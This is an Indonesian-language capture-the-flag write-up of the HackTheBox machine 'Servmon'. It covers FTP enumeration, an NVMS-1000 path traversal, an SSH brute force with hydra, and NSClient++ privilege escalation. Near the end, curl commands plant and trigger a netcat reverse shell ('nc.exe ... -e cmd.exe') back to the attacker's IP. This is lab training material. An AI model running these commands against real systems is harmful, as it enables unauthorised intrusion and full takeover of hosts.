---
layout: posts
title:  "Servmon"
dates:   July 2020
tag:	hackthebox
categories: hackthebox
image: ""
author: "OREOSEC"
---
**Bismillah..**  

Sebagai informasi mesin ini bernama Servmon dengan OS windows dengan total 20 points (easy). Adapun seperti biasanya, tantangan dari HackThebox adalah mengambil alih akses penuh mesin (privilege escalation) untuk mendapatkan user.txt dan root.txt  
  

Intro
-----

Box yang relatif mudah. Masuk ke FTP sebagai anonymous login. Layanan nvms-1000 rentan terhadap eksploitasi publik (Directory Traversal). Membaca file Passwords.txt menggunakan Dir-traversal. Brute Force dan mencoba masuk ke ssh login sebagai Nadine user. Layanan yang berjalan pada port 8443 Nsclient rentan terhadap eksploitasi publik dan kita dapat menggunakannya untuk mendapatkan root

This content
------------

*   [Nmap port scanning](#nmap)
*   [Check anonymous ftp](#ftp)
*   [NVMS 1000 path traversal](#path-traversal)
*   [Login Nadine ssh](#user)
*   [Port forward 8443](#port-forward)
*   [Exploit NSClient++](#gaining-root)
*   [Working with curl](#curl)

Enumerate	
-----

### Nmap scanning {#nmap}

Pertama tama seperti biasa adalah melakukan scanning port untuk menemukan service yang berjalan menggunakan nmap  

```bash
sudo nmap -sCV -oN nmap/serv 10.10.10.184
```

**penjelasan:**

*   \-s: Scanning TCP port mode
*   C: menggunakan common-script pada service yang dituju
*   V: menampilkan version pada service
*   \-oN nmap/serv: write output ke dalam file nmap/serv
*   10.10.10.184: IP servmon

![](/assets/img/servmon/nmap.png)

Yang menarik disini adalah pada port 21 dan 22 yang sebenarnya jarang pada windows box hmmm...

### FTP {#ftp}

Setelah melihat port 21 (ftp) terbuka dan anonymous login dibolehkan maka kita bisa mengeceknya  
```bash
ftp 10.10.10.184
```

*   username: anonymous
*   password: anonymous

kita bisa mendownload file menggunakan perintah "get".  
Disini kita mendapatkan 2 file: "Confidential.txt" dan "Notes to do.txt" 

![](/assets/img/servmon/ftp-content.png) 

Oke karna hanya sebuah catatan (baca: hint) maka kita skip dulu.

Karena port 80 terbuka maka langsung saja kita cek web service yang berjalan ![](/assets/img/servmon/webpage.png)


Saya langsung mencari exploit nvms-1000 pada searchsploit 

![](/assets/img/servmon/searchsploit.png)

### Path Traversal {#path-traversal}

atau kita bisa membukanya [disini](https://www.exploit-db.com/exploits/47774)

Exploit
-------

Langsung saja karna kita sudah mendapatkan hint yaitu pada file Confidential.txt dimana mengatakan "I left your Password.txt on your Desktop" maka kita hanya mengarahkan ke dalam file C:\\Users\\Nathan\\Desktop\\password.txt. Disini saya menggunakan burp suite dan menggunakan mode repeater untuk mengeksploitasinya

![](/assets/img/servmon/burp.png)

Hmmm... ternyata ada beberapa password yang ada di dalam filenya ini mengharuskan kita untuk membrute forcenya. Disini saya menggunakan hydra, karna ssh terbuka maka kita akan membrute force pada bagian ssh

```bash
sudo hydra -l Nadine -P password.txt 10.10.10.184 ssh
```

![](/assets/img/servmon/ssh-brute.png)

Yap disini kita disini mendapatkan passwordnya: L1k3B1gBut7s@W0rk  
maka kita langsung saja login melalui ssh dan mendapatkan user flagnya :)  

### User {#user}

```bash
ssh Nadine@10.10.10.184
```

```bash
Microsoft Windows \[Version 10.0.18363.752\]          
(c) 2019 Microsoft Corporation. All rights reserved.
													
nadine@SERVMON C:\\Users\\Nadine
```			

Disini yang saya lakukan pertama kali adalah melihat program yang terinstall pada Program Files, dan menemukan NSClient++. Saya pun mencarinya menggunakan searchsploit dan yap.. dapat!! terdapat privilege escalation exploit pada service tersebut. 

![](/assets/img/servmon/nsclient-exploit.png) 

setelah mengetahui bahwa nsclient++ bekerja pada port 8443, maka saya mencoba melakukan port forward dari ssh ke host pribadi saya.  

### Port Forward {#port-forward}

```bash
ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
```

  
mengenai tentang port forward ssh kalian bisa membacanya   
[disini](https://www.techrepublic.com/article/how-to-use-local-and-remote-ssh-port-forwarding/)

### Gaining Root access!!! {#gaining-root}

Yap.. tinggal sebentar lagi kita akan menyelesaikan box ini :D maka bersiap siaplah mendapatkan sensasinya B).  
Ikuti instruksi dari refrensi exploit-db diatas, yaitu masuk ke Directory penyimpanan NSClient++ berada lalu lakukan perintah  

```bash
nscp web -- password --display
```

Current password: `ew2x6SsGTxjRwXOT`
				

Karena kita sudah melakukan port forward ke host kita maka kita hanya tinggal membukanya di http://127.0.0.1:8443 

![](/assets/img/servmon/web-nsclient.png)

Sebenarnya disini saya mendapat masalah (webnya gak mau jalan), bahkan bukan saya saja... teman saya yang sudah memakai akun VIP pun sama & akhirnya menyerah.. namun tidak pada saya :) (mungkin ini penyebab box-nya pensiun dini) saya mencari cara dan akhirnya mendapatkan bahwa kita bisa menggunakan API simak [https://docs.nsclient.org/api/rest/](https://docs.nsclient.org/api/rest/)

### Exploit NSClient++ API using curl {#curl}

Pertama tama kita perlu mengupload netcat ke dalam mesin target, saya akan menggunakan scp untuk hal ini simak [disini](https://linux4one.com/how-to-use-scp-command-to-transfer-files-folders-in-linux/)  
netcat: [netcat](https://github.com/diegocr/netcat)  

```bash
scp nc.exe Nadine@10.10.10.184:c:\Temp
```

  
  
listening port dengan netcat: ```bash netcat -lvnp 1337```
Membuat hook script untuk exploit (ganti dengan ip kalian):  

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/shell.bat --data-binary "c:\Temp\nc.exe 10.10.14.19 1337 -e cmd.exe"
```

  
cek apakah file-nya sudah ada:  

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/queries/shell |python -m json.tool
```

```json
{
	"description": "Alias for: scripts\\\\shell.bat",
	"execute\_nagios\_url": "https://localhost:8443/api/v1/queries/shell/commands/execute\_nagios",
	"execute\_url": "https://localhost:8443/api/v1/queries/shell/commands/execute",
	"metadata": {},
	"name": "shell",
	"title": "shell"
}
```
				

File-nya sudah terupload :D mari kita eksekusi!!!  

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/shell/commands/execute?time=1ms
```

  
Daaannnn... 

![](/assets/img/servmon/root.png)

 ROOOOOTTTT!!!!